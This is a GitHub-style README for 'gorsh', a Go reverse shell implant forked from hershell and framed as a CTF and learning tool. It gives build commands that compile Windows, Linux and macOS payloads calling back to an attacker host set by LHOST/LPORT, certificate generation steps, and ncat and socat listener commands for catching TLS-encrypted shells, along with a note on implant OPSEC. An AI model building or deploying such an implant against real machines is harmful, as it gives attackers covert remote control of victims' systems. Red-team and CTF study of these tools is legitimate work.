# gorsh

[go]lang [r]everse [sh]ell

Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)

## Motivation

Learn go.  
Make a throwaway reverse shell for things like CTFs.  
Learn about host-based OPSEC considerations when writing an implant.

## Fork Changes
Changes after fork:

* Uses tmux as a psudeo-C2 interface, creating a new window with each agent callback
* Removed Meterpreter functionality
* Removed Shellcode execution
* Remove the use of passing power/shell commands at the gorsh prompt
* Add common file operation commands that use go instead of power/shell

TODO:

Potentially add reverse socks5 proxy functionality - Using
[Numbers11/rvprxmx](https://github.com/Numbers11/rvprxmx)

--

Simple TCP reverse shell written in [Go](https://golang.org).

It uses TLS to secure the communications, and key fingerprint pinning.

Supported OS are:

- Windows
- Linux
- Mac OS
- FreeBSD and derivatives


## Getting started & dependencies

As this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
your Golang environment (with the `$GOPATH` environment variable).

### Building the payload

To simplify things, you can use the provided Makefile.
You can set the following environment variables:

- ``GOOS`` : the target OS
- ``GOARCH`` : the target architecture
- ``LHOST`` : the attacker IP or domain name
- ``LPORT`` : the listener port

For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).

However, some helper targets are available in the ``Makefile``:

- ``depends`` : generate the server certificate (required for the reverse shell)
- ``windows32`` : builds a windows 32 bits executable (PE 32 bits)
- ``windows64`` : builds a windows 64 bits executable (PE 64 bits)
- ``linux32`` : builds a linux 32 bits executable (ELF 32 bits)
- ``linux64`` : builds a linux 64 bits executable (ELF 64 bits)
- ``macos32`` : builds a mac os 32 bits executable (Mach-O)
- ``macos64`` : builds a mac os 64 bits executable (Mach-O)

For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.

### Using the shell

Once executed, you will be provided with a remote shell. 
Type `help` to show what commands are supported.

## Usage

First of all, you will need to generate a valid certificate:
```bash
$ make depends
openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
....................................................................................++
.....++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
```

Then:

```bash
$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
```

## Catching the shell

The `local/start.sh` kicks off a tmux session and new windows on every new connection.

Shells can also be caught with:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

__Examples__

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
```

## Credits

Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
